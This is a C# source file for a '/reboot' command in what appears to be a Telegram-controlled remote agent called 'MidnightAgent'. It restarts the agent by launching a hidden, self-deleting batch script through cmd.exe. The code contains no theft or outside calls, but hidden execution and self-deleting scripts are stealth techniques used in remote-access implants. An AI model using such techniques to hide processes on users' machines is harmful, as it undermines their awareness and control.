using System;
using System.Diagnostics;
using System.IO;
using System.Threading.Tasks;
using MidnightAgent.Core;

namespace MidnightAgent.Features
{
    public class RestartFeature : IFeature
    {
        public string Command => "reboot";
        public string Description => "Restart the agent process (Reset connection)";
        public string Usage => "/reboot";

        public Task<FeatureResult> ExecuteAsync(string[] args)
        {
            try
            {
                string currentExe = Config.InstallPath; // Or Process.GetCurrentProcess().MainModule.FileName
                
                // Fallback if InstallPath is empty or invalid
                if (string.IsNullOrEmpty(currentExe) || !File.Exists(currentExe))
                {
                    currentExe = Process.GetCurrentProcess().MainModule.FileName;
                }

                string tempPath = Path.Combine(Path.GetTempPath(), "restart_agent.bat");
                
                // Create restart script
                // 1. Wait 2 seconds
                // 2. Start the executable
                // 3. Delete self (the batch file)
                string script = $@"@echo off
timeout /t 3 /nobreak > nul
start """" ""{currentExe}""
del ""%~f0""
";
                File.WriteAllText(tempPath, script);

                // Execute script in background
                Process.Start(new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = $"/c \"{tempPath}\"",
                    CreateNoWindow = true,
                    UseShellExecute = false
                });

                // Reply before dying
                // Note: We won't be able to reply 'success' to the router properly because we exit immediately.
                // So we return 'text' but then schedule exit.
                
                // Use Task.Run to delay exit slightly so the message can be sent
                Task.Run(async () => 
                {
                    await Task.Delay(1000); // Give time for Telegram to send response
                    Environment.Exit(0); 
                });

                return Task.FromResult(FeatureResult.Ok("🔄 <b>Rebooting Agent...</b>\n\nProcess will restart and reset to STANDBY mode.\nYou will need to re-select this agent via /job."));
            }
            catch (Exception ex)
            {
                return Task.FromResult(FeatureResult.Fail($"Reboot failed: {ex.Message}"));
            }
        }
    }
}
